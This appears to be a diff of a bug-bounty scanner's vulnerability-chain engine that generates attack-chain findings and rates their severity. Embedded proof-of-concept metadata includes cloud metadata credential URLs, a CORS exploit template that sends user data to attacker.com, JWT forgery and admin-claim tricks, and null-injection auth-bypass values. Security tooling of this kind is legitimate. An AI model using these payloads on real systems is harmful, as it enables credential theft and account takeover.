+                "poc": {
+                    "aws": {
+                        "metadata_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                        "user_data": "http://169.254.169.254/latest/user-data",
+                    },
+                    "gcp": {
+                        "metadata_url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+                        "required_header": "Metadata-Flavor: Google",
+                    },
+                    "azure": {
+                        "metadata_url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+                        "required_header": "Metadata: true",
+                    },
+                },
+            },
+        }]
+
+    async def _api_key_account_takeover(self, finding: Dict, context: Dict) -> List[Dict]:
+        """API key exposure → Account/service takeover."""
+        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
+        return [{
+            "type": "api_key_takeover_chain",
+            "name": "API Key Exposure → Account Takeover",
+            "severity": "CRITICAL",
+            "confidence": 90,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "description": "Exposed API keys can lead to service/account compromise",
+            "metadata": {
+                "chain_type": "api_key_exploitation",
+                "poc": {
+                    "high_value_keys": [
+                        "AWS_SECRET_ACCESS_KEY",
+                        "GOOGLE_API_KEY",
+                        "STRIPE_SECRET_KEY",
+                        "TWILIO_AUTH_TOKEN",
+                        "GITHUB_TOKEN",
+                        "SENDGRID_API_KEY",
+                    ],
+                    "exploitation_steps": [
+                        "1. Identify the service (AWS, Stripe, Twilio, etc.)",
+                        "2. Test key validity with minimal API call",
+                        "3. Enumerate permissions/scopes",
+                        "4. Document potential impact",
+                    ],
+                },
+            },
+        }]
+
+    async def _jwt_algorithm_confusion(self, finding: Dict, context: Dict) -> List[Dict]:
+        """JWT weakness → Algorithm confusion attack."""
+        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
+        return [{
+            "type": "jwt_algo_confusion_chain",
+            "name": "JWT Weakness → Algorithm Confusion Attack",
+            "severity": "CRITICAL",
+            "confidence": 90,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "description": "JWT algorithm confusion allows forging valid tokens",
+            "metadata": {
+                "chain_type": "jwt_algorithm_confusion",
+                "bounty_range": "$5,000 - $20,000",
+                "poc": {
+                    "attacks": [
+                        {"name": "RS256 → HS256", "description": "Use public key as HMAC secret"},
+                        {"name": "alg: none", "description": "Remove signature entirely"},
+                        {"name": "JWK injection", "description": "Embed attacker's key in header"},
+                        {"name": "jku/x5u injection", "description": "Point to attacker's key server"},
+                    ],
+                    "tools": ["jwt_tool", "python-jwt", "jose"],
+                },
+            },
+        }]
+
+    async def _jwt_privilege_escalation(self, finding: Dict, context: Dict) -> List[Dict]:
+        """JWT weakness → Forge admin tokens."""
+        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
+        return [{
+            "type": "jwt_privesc_chain",
+            "name": "JWT Weakness → Admin Token Forgery",
+            "severity": "CRITICAL",
+            "confidence": 90,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "description": "JWT vulnerability allows forging administrative tokens",
+            "metadata": {
+                "chain_type": "jwt_privilege_escalation",
+                "poc": {
+                    "claim_modifications": [
+                        {"claim": "role", "value": "admin"},
+                        {"claim": "is_admin", "value": True},
+                        {"claim": "permissions", "value": ["*"]},
+                        {"claim": "user_id", "value": 1},
+                    ],
+                },
+            },
+        }]
+
+    async def _cors_credential_theft(self, finding: Dict, context: Dict) -> List[Dict]:
+        """CORS misconfiguration → Steal auth tokens via XHR."""
+        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
+        return [{
+            "type": "cors_theft_chain",
+            "name": "CORS Misconfiguration → Credential Theft",
+            "severity": "HIGH",
+            "confidence": 85,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "description": "CORS misconfiguration allows cross-origin credential theft",
+            "metadata": {
+                "chain_type": "cors_credential_theft",
+                "poc": {
+                    "vulnerable_configs": [
+                        "Access-Control-Allow-Origin: * (with credentials)",
+                        "Access-Control-Allow-Origin: null",
+                        "Origin reflection without validation",
+                    ],
+                    "exploit_template": """
+fetch('https://vulnerable-api.com/user/data', {
+    credentials: 'include'
+}).then(r => r.json())
+  .then(data => fetch('https://attacker.com/steal?data=' + btoa(JSON.stringify(data))))
+""",
+                },
+            },
+        }]
+
+    async def _cache_stored_xss(self, finding: Dict, context: Dict) -> List[Dict]:
+        """Cache poisoning → Persistent XSS via CDN cache."""
+        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
+        return [{
+            "type": "cache_xss_chain",
+            "name": "Cache Poisoning → Stored XSS via CDN",
+            "severity": "CRITICAL",
+            "confidence": 85,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "description": "Cache poisoning combined with XSS creates persistent attack affecting all users",
+            "metadata": {
+                "chain_type": "cache_stored_xss",
+                "bounty_range": "$10,000 - $30,000 (affects all users)",
+                "poc": {
+                    "technique": "Inject XSS payload via unkeyed header, cache the response",
+                    "unkeyed_headers": [
+                        "X-Forwarded-Host", "X-Forwarded-Scheme",
+                        "X-Original-URL", "X-Rewrite-URL",
+                    ],
+                    "impact": "Stored XSS affecting all users who hit the cached response",
+                },
+            },
+        }]
+
+    async def _cache_dos_chain(self, finding: Dict, context: Dict) -> List[Dict]:
+        """Cache poisoning → DoS via cached error responses."""
+        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))
+        return [{
+            "type": "cache_dos_chain",
+            "name": "Cache Poisoning → DoS via Cached Errors",
+            "severity": "HIGH",
+            "confidence": 80,
+            "matched_at": endpoint,
+            "url": endpoint,
+            "description": "Cache poisoning can cache error responses, causing denial of service",
+            "metadata": {
+                "chain_type": "cache_dos",
+                "poc": {
+                    "technique": "Cause 4xx/5xx error via malformed request, cache it",
+                    "impact": "All users see cached error until TTL expires",
+                },
+            },
+        }]
+
+    async def _speculative_aws_attack_paths(self, finding: Dict, context: Dict) -> List[Dict]:
+        """
+        Speculative chain: Suggest AWS-specific attack paths based on detected technology.
+        This runs even without confirmed vulnerabilities to guide testing.
+        """
+        target = context.get("target", "")
+        technologies = context.get("technologies", [])
+
+        attack_paths = []
+
+        # Check if running on AWS
+        is_aws = any("aws" in str(t).lower() or "cloudfront" in str(t).lower()
+                     for t in technologies)
+
+        if is_aws:
+            attack_paths.append({
+                "type": "speculative_aws_chain",
+                "name": "AWS Environment Detected → Recommended Attack Paths",
+                "severity": "INFO",
+                "confidence": 60,
+                "matched_at": target,
+                "url": target,
+                "description": "AWS/CloudFront detected. Recommended high-value attack vectors to test.",
+                "metadata": {
+                    "chain_type": "speculative_aws",
+                    "is_speculative": True,
+                    "recommended_tests": [
+                        {
+                            "name": "SSRF → AWS Metadata",
+                            "description": "Test all URL parameters for SSRF to 169.254.169.254",
+                            "bounty_potential": "$10k-$50k",
+                        },
+                        {
+                            "name": "CloudFront Origin Bypass",
+                            "description": "Test X-Forwarded-Host, Host header manipulation",
+                            "bounty_potential": "$5k-$15k",
+                        },
+                        {
+                            "name": "S3 Bucket Discovery",
+                            "description": "Look for S3 references in JS, check for misconfigurations",
+                            "bounty_potential": "$5k-$25k",
+                        },
+                        {
+                            "name": "AWS Cognito Misconfiguration",
+                            "description": "Check for exposed Cognito pools, self-registration issues",
+                            "bounty_potential": "$3k-$10k",
+                        },
+                        {
+                            "name": "Lambda Function URL Auth Bypass",
+                            "description": "Test for unauthenticated Lambda function URLs",
+                            "bounty_potential": "$5k-$15k",
+                        },
+                    ],
+                    "safe_mode_note": "These are test recommendations, not confirmed vulnerabilities",
+                },
+            })
+
+        return attack_paths
+
+    async def _speculative_api_attack_paths(self, finding: Dict, context: Dict) -> List[Dict]:
+        """
+        Speculative chain: Suggest API-specific attack paths.
+        """
+        target = context.get("target", "")
+
+        return [{
+            "type": "speculative_api_chain",
+            "name": "API Endpoint Detected → Recommended Attack Paths",
+            "severity": "INFO",
+            "confidence": 60,
+            "matched_at": target,
+            "url": target,
+            "description": "API detected. Recommended high-value attack vectors to test.",
+            "metadata": {
+                "chain_type": "speculative_api",
+                "is_speculative": True,
+                "recommended_tests": [
+                    {
+                        "name": "BOLA/IDOR Testing",
+                        "description": "Test all ID parameters with different user contexts",
+                        "bounty_potential": "$3k-$15k",
+                    },
+                    {
+                        "name": "Mass Assignment",
+                        "description": "Add extra fields to POST/PUT requests (is_admin, role, etc.)",
+                        "bounty_potential": "$3k-$10k",
+                    },
+                    {
+                        "name": "Rate Limit Bypass",
+                        "description": "Test X-Forwarded-For, IP rotation, GraphQL batching",
+                        "bounty_potential": "$1k-$5k",
+                    },
+                    {
+                        "name": "GraphQL Introspection",
+                        "description": "Query __schema for full API structure",
+                        "bounty_potential": "$1k-$3k",
+                    },
+                    {
+                        "name": "JWT Vulnerabilities",
+                        "description": "Test alg:none, RS256→HS256, expired token acceptance",
+                        "bounty_potential": "$5k-$20k",
+                    },
+                ],
+            },
+        }]
+
+    # ════════════════════════════════════════════════════════════════════════
+    # COMMUNICATIONS API CHAIN HANDLERS (Twilio, SendGrid, Authy)
+    # ════════════════════════════════════════════════════════════════════════
+
+    async def _comms_phone_enumeration_chain(self, finding: Dict, context: Dict) -> List[Dict]:
+        """
+        Chain: Phone enumeration → Mass data collection.
+        CVE-2024-39891 pattern: Authy API leaked 33M phone numbers.
+        """
+        url = finding.get("url") or finding.get("matched_at", "")
+
+        return [{
+            "type": "phone_enumeration_chain",
+            "name": "Phone Enumeration → Mass User Data Collection",
+            "severity": "HIGH",
+            "confidence": 90,
+            "matched_at": url,
+            "url": url,
+            "description": (
+                "Phone number enumeration vulnerability enables mass collection "
+                "of user registration data. Similar to CVE-2024-39891 which exposed "
+                "33 million Twilio Authy users' phone numbers."
+            ),
+            "metadata": {
+                "chain_type": "comms_phone_enumeration",
+                "cve_reference": "CVE-2024-39891",
+                "impact": [
+                    "Mass collection of registered phone numbers",
+                    "User privacy violation affecting millions",
+                    "Enable targeted phishing/smishing attacks",
+                    "SIM swapping attack preparation",
+                ],
+                "bounty_potential": "$5k-$15k (data exposure affecting many users)",
+                "exploitation": {
+                    "technique": "Iterate through phone numbers, observe different responses",
+                    "automation": "Can enumerate thousands of numbers per minute",
+                    "rate_limiting": "May be bypassed via distributed requests",
+                },
+            },
+        }]
+
+    async def _comms_sms_pumping_chain(self, finding: Dict, context: Dict) -> List[Dict]:
+        """
+        Chain: SMS abuse endpoint → Toll fraud (IRSF).
+        This is Twilio's #1 financial concern - Fraud Guard saved $62.7M.
+        """
+        url = finding.get("url") or finding.get("matched_at", "")
+
+        return [{
+            "type": "sms_pumping_chain",
+            "name": "SMS Abuse → International Revenue Share Fraud (IRSF)",
+            "severity": "CRITICAL",
+            "confidence": 95,
+            "matched_at": url,
+            "url": url,
+            "description": (
+                "Unprotected SMS/Voice endpoint enables toll fraud attacks. "
+                "Attackers can send SMS/calls to premium rate numbers, "
+                "causing massive financial damage. Twilio Fraud Guard has "
+                "prevented $62.7M in fraud between June 2022-October 2024."
+            ),
+            "metadata": {
+                "chain_type": "comms_toll_fraud",
+                "attack_name": "SMS Pumping / IRSF (International Revenue Share Fraud)",
+                "impact": [
+                    "Direct financial loss ($10k-$1M+ per incident)",
+                    "Reputation damage to the platform",
+                    "Service disruption if accounts get suspended",
+                    "Legal liability for fraud-related damages",
+                ],
+                "bounty_potential": "$10k-$50k (critical financial impact)",
+                "attack_vectors": [
+                    "SMS to premium rate numbers (+882, +883 prefixes)",
+                    "Voice calls to international revenue share numbers",
+                    "Automated registration with IRSF phone numbers",
+                    "Verification code spam to expensive destinations",
+                ],
+                "safe_mode_note": "PHANTOM detects the vulnerability without exploitation",
+            },
+        }]
+
+    async def _comms_twilio_credential_chain(self, finding: Dict, context: Dict) -> List[Dict]:
+        """
+        Chain: Twilio credential exposure → Full account compromise.
+        """
+        url = finding.get("url") or finding.get("matched_at", "")
+        evidence = finding.get("evidence", [])
+
+        return [{
+            "type": "twilio_credential_chain",
+            "name": "Twilio Credential Exposure → Complete Account Takeover",
+            "severity": "CRITICAL",
+            "confidence": 100,
+            "matched_at": url,
+            "url": url,
+            "description": (
+                "Exposed Twilio credentials (Account SID/Auth Token) enable "
+                "complete account takeover, including sending SMS/calls, "
+                "accessing call logs, and incurring toll fraud charges."
+            ),
+            "metadata": {
+                "chain_type": "comms_credential_takeover",
+                "credential_type": "Twilio Account SID + Auth Token",
+                "impact": [
+                    "Send SMS/MMS as the account owner",
+                    "Make/receive calls using the account",
+                    "Access all call/message logs (privacy breach)",
+                    "Incur unlimited toll fraud charges",
+                    "Access Twilio Verify, Authy configurations",
+                    "Pivot to connected services (SendGrid, Segment)",
+                ],
+                "bounty_potential": "$15k-$50k (full account compromise)",
+                "evidence": evidence,
+                "remediation": [
+                    "Rotate credentials immediately",
+                    "Review recent API activity for abuse",
+                    "Enable API key restrictions",
+                    "Set up usage alerts and limits",
+                ],
+            },
+        }]
+
+    async def _comms_sendgrid_credential_chain(self, finding: Dict, context: Dict) -> List[Dict]:
+        """
+        Chain: SendGrid API key exposure → Email abuse.
+        """
+        url = finding.get("url") or finding.get("matched_at", "")
+
+        return [{
+            "type": "sendgrid_credential_chain",
+            "name": "SendGrid API Key Exposure → Email Abuse",
+            "severity": "CRITICAL",
+            "confidence": 100,
+            "matched_at": url,
+            "url": url,
+            "description": (
+                "Exposed SendGrid API key enables sending emails as the "
+                "legitimate domain owner, enabling sophisticated phishing attacks."
+            ),
+            "metadata": {
+                "chain_type": "comms_sendgrid_takeover",
+                "impact": [
+                    "Send emails as the legitimate domain",
+                    "Conduct phishing using trusted sender",
+                    "Access email templates and contact lists",
+                    "View email statistics and bounces",
+                    "Exhaust email sending quota",
+                ],
+                "bounty_potential": "$10k-$25k (email abuse potential)",
+            },
+        }]
+
+    async def _comms_verify_abuse_chain(self, finding: Dict, context: Dict) -> List[Dict]:
+        """
+        Chain: Verify rate limit bypass → SMS pumping + OTP brute force.
+        """
+        url = finding.get("url") or finding.get("matched_at", "")
+
+        return [{
+            "type": "verify_abuse_chain",
+            "name": "Verify Rate Limit Bypass → SMS Pumping + OTP Brute Force",
+            "severity": "HIGH",
+            "confidence": 90,
+            "matched_at": url,
+            "url": url,
+            "description": (
+                "Missing rate limiting on verification endpoint enables "
+                "two attack vectors: SMS pumping (toll fraud) and OTP brute force."
+            ),
+            "metadata": {
+                "chain_type": "comms_verify_abuse",
+                "attack_vectors": [
+                    {
+                        "name": "SMS Pumping",
+                        "description": "Trigger verification to premium numbers",
+                        "impact": "Direct financial loss",
+                    },
+                    {
+                        "name": "OTP Brute Force",
+                        "description": "Guess 6-digit codes (1M combinations)",
+                        "impact": "Account takeover via verification bypass",
+                    },
+                ],
+                "bounty_potential": "$5k-$15k",
+            },
+        }]
+
+    async def _comms_auth_bypass_chain(self, finding: Dict, context: Dict) -> List[Dict]:
+        """
+        Chain: Auth bypass via null injection → Complete authentication bypass.
+        CVE-2020-24655 pattern: Authy Android PIN bypass via @null.
+        """
+        url = finding.get("url") or finding.get("matched_at", "")
+
+        return [{
+            "type": "auth_bypass_chain",
+            "name": "Authentication Bypass via Null Injection",
+            "severity": "CRITICAL",
+            "confidence": 95,
+            "matched_at": url,
+            "url": url,
+            "description": (
+                "Authentication bypassed using null/empty value injection. "
+                "Similar to CVE-2020-24655 which allowed Authy PIN bypass."
+            ),
+            "metadata": {
+                "chain_type": "comms_auth_bypass",
+                "cve_reference": "CVE-2020-24655",
+                "impact": [
+                    "Complete authentication bypass",
+                    "Access to protected user accounts",
+                    "2FA/MFA bypass if affects verification",
+                ],
+                "bounty_potential": "$10k-$50k (critical auth bypass)",
+            },
+        }]
+
+    async def _speculative_comms_attack_paths(self, finding: Dict, context: Dict) -> List[Dict]:
+        """
+        Speculative chain: Suggest communications platform attack paths.
+        """
+        target = context.get("target", "")
+
+        return [{
+            "type": "speculative_comms_chain",
+            "name": "Communications Platform Detected → High-Value Attack Paths",
+            "severity": "INFO",
+            "confidence": 60,
+            "matched_at": target,
+            "url": target,
+            "description": (
+                "Twilio/SendGrid/Authy platform detected. "
+                "These platforms have historically paid $5k-$50k for critical findings."
+            ),
+            "metadata": {
+                "chain_type": "speculative_comms",
+                "is_speculative": True,
+                "recommended_tests": [
+                    {
+                        "name": "Phone Number Enumeration (CVE-2024-39891)",
+                        "description": "Test registration/verify endpoints for enumeration",
+                        "endpoints": ["/authy/users/new", "/verify/lookup", "/protected/json/users"],
+                        "bounty_potential": "$5k-$15k",
+                    },
+                    {
+                        "name": "SMS Pumping / Toll Fraud",
+                        "description": "Check for rate limiting on SMS endpoints",
+                        "endpoints": ["/Messages.json", "/Calls.json", "/verify/start"],
+                        "bounty_potential": "$10k-$50k",
+                    },
+                    {
+                        "name": "Twilio Credential in Responses",
+                        "description": "Look for ACxxxxxxxx (SID) or SKxxxxxxxx (API key) patterns",
+                        "bounty_potential": "$15k-$50k",
+                    },
+                    {
+                        "name": "Auth Bypass (CVE-2020-24655)",
+                        "description": "Test null injection: pin=@null, code=null, token=''",
+                        "bounty_potential": "$10k-$50k",
+                    },
+                    {
+                        "name": "OTP Brute Force",
+                        "description": "Test rate limiting on verification code checks",
+                        "bounty_potential": "$5k-$15k",
+                    },
+                ],
+                "historical_bounties": [
+                    "CVE-2024-39891: Authy phone enumeration - affected 33M users",
+                    "CVE-2020-24655: Authy PIN bypass - authentication bypass",
+                    "SMS Pumping: Fraud Guard saved $62.7M from toll fraud",
+                ],
+            },
+        }]
+
+    # ════════════════════════════════════════════════════════════════════════
+    # TECHNOLOGY-BASED SPECULATIVE CHAIN GENERATION
+    # ════════════════════════════════════════════════════════════════════════
+
+    async def generate_speculative_chains(self, technologies: List[str], target: str) -> List[Dict]:
+        """
+        Generate speculative attack chains based on detected technologies.
+        This is called even when no vulnerabilities are confirmed, to suggest
+        high-value attack paths for manual testing.
+
+        SAFETY: These are recommendations only, not exploits.
+        """
+        chains = []
+        tech_lower = [str(t).lower() for t in technologies]
+
+        # AWS/CloudFront speculative chains
+        if any("aws" in t or "cloudfront" in t or "amazon" in t for t in tech_lower):
+            self.context["technologies"] = technologies
+            self.context["target"] = target
+            aws_chains = await self._speculative_aws_attack_paths({}, self.context)
+            chains.extend(aws_chains)
+
+        # API speculative chains
+        if "api" in target.lower() or any("api" in t for t in tech_lower):
+            self.context["target"] = target
+            api_chains = await self._speculative_api_attack_paths({}, self.context)
+            chains.extend(api_chains)
+
+        # Communications platform speculative chains (Twilio, SendGrid, Authy, Segment)
+        comms_domains = ["twilio", "sendgrid", "authy", "segment"]
+        if any(domain in target.lower() for domain in comms_domains):
+            self.context["target"] = target
+            comms_chains = await self._speculative_comms_attack_paths({}, self.context)
+            chains.extend(comms_chains)
+
+        return chains
 
     def get_statistics(self) -> Dict[str, Any]:
         """Get chain engine statistics."""
@@ -1339,5 +2436,349 @@ class VulnerabilityChainEngine:
             "average_execution_time": (
                 sum(r.execution_time for r in self.chain_results) / len(self.chain_results)
                 if self.chain_results else 0
+            ),
+        }
+
+    # ═══════════════════════════════════════════════════════════════════════════════
+    # CHAIN QUALITY CONTROL - Deduplication, Validation, and Strength Rating
+    # Prevents inflated/duplicate chains and false positive chain suggestions
+    # ═══════════════════════════════════════════════════════════════════════════════
+
+    # Chains that require specific target characteristics
+    CHAIN_CONTEXT_REQUIREMENTS: Dict[str, Dict[str, Any]] = {
+        # SSRF → Internal Breach requires actual internal services
+        "ssrf_internal_services": {
+            "requires_any": ["has_internal_endpoints", "is_cloud_hosted", "has_kubernetes"],
+            "description": "SSRF to internal breach requires internal services to target",
+        },
+        "ssrf_internal_port_scan": {
+            "requires_any": ["has_internal_endpoints", "is_cloud_hosted"],
+            "description": "SSRF port scan needs internal network access",
+        },
+        # Cloud chains require cloud presence
+        "ssrf_cloud_metadata": {
+            "requires_any": ["is_cloud_hosted", "has_aws", "has_gcp", "has_azure"],
+            "description": "Cloud metadata requires cloud-hosted infrastructure",
+        },
+        "ssrf_aws_imds_v2": {
+            "requires_any": ["has_aws", "is_cloud_hosted"],
+            "description": "AWS IMDS requires AWS infrastructure",
+        },
+        # LFI log poisoning requires writable logs
+        "lfi_log_poisoning": {
+            "requires_any": ["has_apache", "has_nginx", "has_php"],
+            "description": "Log poisoning requires web server with accessible logs",
+        },
+    }
+
+    # Weak chain combinations that shouldn't be rated HIGH/CRITICAL
+    WEAK_CHAIN_PATTERNS: List[Dict[str, Any]] = [
+        {
+            "vulns": {"xss", "crlf"},
+            "max_severity": "MEDIUM",
+            "reason": "XSS + CRLF is weak chain without additional impact",
+        },
+        {
+            "vulns": {"xss", "csrf"},
+            "conditions": ["same_domain", "no_sensitive_action"],
+            "max_severity": "MEDIUM",
+            "reason": "XSS + CSRF needs sensitive action for ATO",
+        },
+        {
+            "vulns": {"open_redirect"},
+            "max_severity": "LOW",
+            "reason": "Open redirect alone has limited impact",
+        },
+        {
+            "vulns": {"information_disclosure"},
+            "max_severity": "LOW",
+            "reason": "Info disclosure needs exploitation path",
+        },
+    ]
+
+    # Duplicate chain patterns to merge
+    DUPLICATE_CHAIN_PATTERNS: List[Dict[str, Any]] = [
+        {
+            "pattern": ["xss", "csrf"],
+            "variations": [["csrf", "xss"], ["xss", "session_fixation"]],
+            "keep": "first",
+        },
+        {
+            "pattern": ["auth_bypass", "privilege_escalation"],
+            "variations": [["authentication_bypass", "priv_esc"]],
+            "keep": "first",
+        },
+    ]
+
+    def validate_and_deduplicate_chains(
+        self,
+        chains: List[Dict[str, Any]],
+        target_context: Optional[Dict[str, Any]] = None,
+    ) -> List[Dict[str, Any]]:
+        """
+        Clean up chains: deduplicate, validate context, and rate strength.
+
+        Args:
+            chains: List of chain findings
+            target_context: Context about the target (technologies, hosting, etc.)
+
+        Returns:
+            Cleaned list of validated chains
+        """
+        if not chains:
+            return []
+
+        context = target_context or self.context or {}
+
+        # Step 1: Deduplicate similar chains
+        unique_chains = self._deduplicate_chains(chains)
+        logger.debug(f"Chain dedup: {len(chains)} → {len(unique_chains)}")
+
+        # Step 2: Validate chains make sense for target
+        valid_chains = []
+        for chain in unique_chains:
+            is_valid, reason = self._validate_chain_context(chain, context)
+            if is_valid:
+                valid_chains.append(chain)
+            else:
+                logger.debug(f"Chain rejected: {chain.get('type', 'unknown')} - {reason}")
+
+        logger.debug(f"Chain validation: {len(unique_chains)} → {len(valid_chains)}")
+
+        # Step 3: Rate chain strength and adjust severity
+        rated_chains = []
+        for chain in valid_chains:
+            rated_chain = self._rate_chain_strength(chain, context)
+            rated_chains.append(rated_chain)
+
+        return rated_chains
+
+    def _deduplicate_chains(self, chains: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+        """
+        Remove duplicate and near-duplicate chains.
+
+        Deduplication rules:
+        - Same vulnerability types in chain → keep highest confidence
+        - XSS + CSRF and CSRF + XSS → keep first occurrence
+        - Same endpoint different chain → merge if overlapping
+        """
+        if not chains:
+            return []
+
+        seen_signatures: Dict[str, Dict[str, Any]] = {}
+        unique_chains = []
+
+        for chain in chains:
+            # Generate chain signature for deduplication
+            signature = self._get_chain_signature(chain)
+
+            if signature in seen_signatures:
+                existing = seen_signatures[signature]
+                # Keep the one with higher confidence
+                existing_conf = existing.get("confidence", 0)
+                new_conf = chain.get("confidence", 0)
+
+                # Normalize confidence if string
+                if isinstance(existing_conf, str):
+                    existing_conf = {"HIGH": 0.9, "MEDIUM": 0.7, "LOW": 0.5}.get(existing_conf.upper(), 0.5)
+                if isinstance(new_conf, str):
+                    new_conf = {"HIGH": 0.9, "MEDIUM": 0.7, "LOW": 0.5}.get(new_conf.upper(), 0.5)
+
+                if new_conf > existing_conf:
+                    # Replace with higher confidence chain
+                    idx = unique_chains.index(existing)
+                    unique_chains[idx] = chain
+                    seen_signatures[signature] = chain
+            else:
+                seen_signatures[signature] = chain
+                unique_chains.append(chain)
+
+        return unique_chains
+
+    def _get_chain_signature(self, chain: Dict[str, Any]) -> str:
+        """Generate a signature for chain deduplication."""
+        # Extract vulnerability types from chain
+        chain_type = chain.get("type", "").lower()
+        vulns = chain.get("vulnerabilities", [])
+
+        if isinstance(vulns, list):
+            vuln_types = sorted([v.get("type", "").lower() if isinstance(v, dict) else str(v).lower() for v in vulns])
+        else:
+            vuln_types = [chain_type]
+
+        # Also consider the chain description for uniqueness
+        description = chain.get("description", "").lower()
+
+        # Normalize common variations
+        normalized_vulns = []
+        for v in vuln_types:
+            v = v.replace("_", "").replace("-", "").replace(" ", "")
+            # Map variations to canonical names
+            if "xss" in v or "crosssite" in v:
+                normalized_vulns.append("xss")
+            elif "csrf" in v or "requestforgery" in v:
+                normalized_vulns.append("csrf")
+            elif "sqli" in v or "sqlinjection" in v:
+                normalized_vulns.append("sqli")
+            elif "ssrf" in v or "serverside" in v:
+                normalized_vulns.append("ssrf")
+            elif "auth" in v and "bypass" in v:
+                normalized_vulns.append("authbypass")
+            elif "priv" in v and ("esc" in v or "elev" in v):
+                normalized_vulns.append("privesc")
+            else:
+                normalized_vulns.append(v)
+
+        # Sort for consistent ordering
+        normalized_vulns = sorted(set(normalized_vulns))
+
+        # Include endpoint if available
+        endpoint = chain.get("url", chain.get("matched_at", ""))
+        if endpoint:
+            parsed = urlparse(endpoint)
+            endpoint_key = parsed.path[:50]  # First 50 chars of path
+        else:
+            endpoint_key = ""
+
+        return f"{'-'.join(normalized_vulns)}:{endpoint_key}"
+
+    def _validate_chain_context(
+        self,
+        chain: Dict[str, Any],
+        context: Dict[str, Any]
+    ) -> tuple[bool, str]:
+        """
+        Validate if a chain makes sense for the target context.
+
+        Returns:
+            (is_valid, reason) tuple
+        """
+        chain_type = chain.get("type", "").lower()
+        chain_action = chain.get("chain_action", chain.get("action", "")).lower()
+
+        # Check specific chain requirements
+        for action_key, requirements in self.CHAIN_CONTEXT_REQUIREMENTS.items():
+            if action_key in chain_type or action_key in chain_action:
+                requires_any = requirements.get("requires_any", [])
+
+                if requires_any:
+                    # Check if any required context is present
+                    has_required = any(context.get(req) for req in requires_any)
+
+                    if not has_required:
+                        return False, requirements.get("description", "Missing required context")
+
+        # Check for speculative chains on simple targets
+        is_speculative = chain.get("is_speculative", False) or "speculative" in chain_type
+        if is_speculative:
+            # Speculative chains on simple apps without cloud/internal infra are low value
+            has_complexity = any([
+                context.get("is_cloud_hosted"),
+                context.get("has_internal_endpoints"),
+                context.get("has_microservices"),
+                context.get("has_kubernetes"),
+                len(context.get("technologies", [])) > 3,
+            ])
+
+            if not has_complexity and "internal" in chain_type.lower():
+                return False, "Speculative internal chain on simple target"
+
+        return True, "Valid"
+
+    def _rate_chain_strength(
+        self,
+        chain: Dict[str, Any],
+        context: Dict[str, Any]
+    ) -> Dict[str, Any]:
+        """
+        Rate chain strength and adjust severity if needed.
+
+        Weak chains are downgraded, strong chains remain as-is.
+        """
+        chain = chain.copy()  # Don't modify original
+
+        # Extract vulnerability types from chain
+        chain_vulns = set()
+        vulns = chain.get("vulnerabilities", [])
+        if isinstance(vulns, list):
+            for v in vulns:
+                if isinstance(v, dict):
+                    chain_vulns.add(v.get("type", "").lower().replace("_", "").replace("-", ""))
+                else:
+                    chain_vulns.add(str(v).lower().replace("_", "").replace("-", ""))
+
+        # Also check chain type
+        chain_type = chain.get("type", "").lower()
+        if "xss" in chain_type:
+            chain_vulns.add("xss")
+        if "csrf" in chain_type:
+            chain_vulns.add("csrf")
+        if "crlf" in chain_type:
+            chain_vulns.add("crlf")
+
+        # Check against weak patterns
+        current_severity = chain.get("severity", "MEDIUM").upper()
+        severity_order = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "INFO": 0}
+        current_level = severity_order.get(current_severity, 2)
+
+        for pattern in self.WEAK_CHAIN_PATTERNS:
+            pattern_vulns = pattern.get("vulns", set())
+
+            # Check if chain matches weak pattern
+            if pattern_vulns.issubset(chain_vulns) or chain_vulns.issubset(pattern_vulns):
+                max_severity = pattern.get("max_severity", "MEDIUM")
+                max_level = severity_order.get(max_severity, 2)
+
+                # Downgrade if current severity exceeds max for weak chain
+                if current_level > max_level:
+                    chain["severity"] = max_severity
+                    chain["severity_reason"] = pattern.get("reason", "Weak chain pattern")
+                    logger.debug(f"Chain downgraded: {current_severity} → {max_severity} ({pattern.get('reason')})")
+                    break
+
+        # Mark speculative chains appropriately
+        if chain.get("is_speculative") and current_severity in ["CRITICAL", "HIGH"]:
+            if not chain.get("verified", False):
+                chain["severity"] = "MEDIUM"
+                chain["severity_reason"] = "Speculative chain (not verified)"
+
+        return chain
+
+    def get_chain_quality_report(self, chains: List[Dict[str, Any]]) -> Dict[str, Any]:
+        """Generate a quality report for chains."""
+        if not chains:
+            return {"total": 0, "quality": "N/A"}
+
+        # Count by strength
+        critical = sum(1 for c in chains if c.get("severity", "").upper() == "CRITICAL")
+        high = sum(1 for c in chains if c.get("severity", "").upper() == "HIGH")
+        medium = sum(1 for c in chains if c.get("severity", "").upper() == "MEDIUM")
+        low = sum(1 for c in chains if c.get("severity", "").upper() in ["LOW", "INFO"])
+
+        # Count verified vs speculative
+        verified = sum(1 for c in chains if c.get("verified", False))
+        speculative = sum(1 for c in chains if c.get("is_speculative", False))
+
+        # Calculate quality score
+        quality_score = (
+            critical * 10 + high * 7 + medium * 4 + low * 1
+        ) / len(chains) if chains else 0
+
+        return {
+            "total": len(chains),
+            "by_severity": {
+                "critical": critical,
+                "high": high,
+                "medium": medium,
+                "low": low,
+            },
+            "verified": verified,
+            "speculative": speculative,
+            "quality_score": round(quality_score, 2),
+            "quality": (
+                "Excellent" if quality_score >= 8 else
+                "Good" if quality_score >= 5 else
+                "Fair" if quality_score >= 3 else
+                "Weak"
             ),
         }
